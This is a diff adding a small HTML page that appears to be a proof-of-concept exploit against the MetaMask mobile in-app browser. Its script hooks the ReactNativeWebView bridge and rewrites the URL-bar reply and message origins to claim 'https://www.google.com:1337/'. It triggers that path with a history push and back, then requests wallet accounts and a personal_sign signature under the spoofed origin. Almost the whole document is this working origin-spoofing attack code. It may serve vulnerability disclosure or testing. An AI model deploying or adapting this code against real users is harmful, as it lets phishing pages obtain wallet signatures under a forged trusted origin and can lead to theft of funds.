@@ -1,0 +1,109 @@
+<!doctype html>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Hello World!</title>
+
+<h1>Hello World!</h1>
+<button id="go">start</button>
+<pre id="log"></pre>
+
+<script>
+  const CLAIM = "https://www.google.com:1337/";
+  const CLAIM_TITLE = "Google";
+  const MESSAGE_TYPE = "DOCUMENT_URL_FOR_URL_BAR";
+  const MESSAGE = "0x48656c6c6f20576f726c6421"; // "Hello World!"
+  const BACK_DELAY_MS = 200;
+  const SIGN_DELAY_MS = 2000;
+
+  const logEl = document.getElementById("log");
+  const log = (message) => {
+    logEl.textContent += `${new Date().toTimeString().slice(0, 8)}  ${message}\n`;
+  };
+
+  let active = false;
+
+  // MetaMask resolves the address bar by asking the page for
+  // window.location.href over this channel, correlated by requestId. The page
+  // owns the channel, so the reply can be edited with the id left intact.
+  const hookBridge = () => {
+    const bridge = window.ReactNativeWebView;
+    if (typeof bridge?.postMessage !== "function") {
+      log("ReactNativeWebView.postMessage absent");
+      return false;
+    }
+
+    const original = bridge.postMessage;
+    bridge.postMessage = function postMessage(data) {
+      if (!active || typeof data !== "string") {
+        return original.call(this, data);
+      }
+
+      let parsed;
+      try {
+        parsed = JSON.parse(data);
+      } catch {
+        return original.call(this, data);
+      }
+
+      if (parsed?.type === MESSAGE_TYPE && parsed.payload) {
+        log(`intercepted, requestId ${parsed.payload.requestId} kept`);
+        log(`  ${parsed.payload.url}`);
+        log(`  -> ${CLAIM}`);
+        parsed.payload.url = CLAIM;
+        parsed.payload.title = CLAIM_TITLE;
+      } else if (parsed?.name) {
+        // The bridge is rebuilt for the claimed origin and drops RPC that does
+        // not match it.
+        parsed.origin = CLAIM;
+      } else {
+        return original.call(this, data);
+      }
+
+      return original.call(this, JSON.stringify(parsed));
+    };
+
+    return true;
+  };
+
+  const requestSignature = async () => {
+    const provider = window.ethereum;
+    if (!provider) {
+      log("window.ethereum absent");
+      return;
+    }
+
+    try {
+      log("requesting accounts");
+      const accounts = await provider.request({ method: "eth_requestAccounts" });
+      if (!accounts?.length) {
+        log("no accounts");
+        return;
+      }
+      log(`accounts ${JSON.stringify(accounts)}`);
+
+      log("requesting signature — check the origin on the sheet");
+      const signature = await provider.request({
+        method: "personal_sign",
+        params: [MESSAGE, accounts[0]],
+      });
+      log(`signed ${signature.slice(0, 24)}…`);
+    } catch (error) {
+      log(`rejected: ${error?.message ?? error}`);
+    }
+  };
+
+  // popstate on a same-document entry is what the app sees as a back/forward
+  // navigation, which is the path that asks for the URL.
+  const start = () => {
+    active = true;
+    log(`claiming ${CLAIM}`);
+    history.pushState({}, "", location.href);
+    setTimeout(() => history.back(), BACK_DELAY_MS);
+    setTimeout(requestSignature, SIGN_DELAY_MS);
+  };
+
+  const hooked = hookBridge();
+  document.getElementById("go").addEventListener("click", start);
+  log(`origin ${location.origin}`);
+  log(hooked ? "bridge hooked" : "bridge not hooked");
+</script>
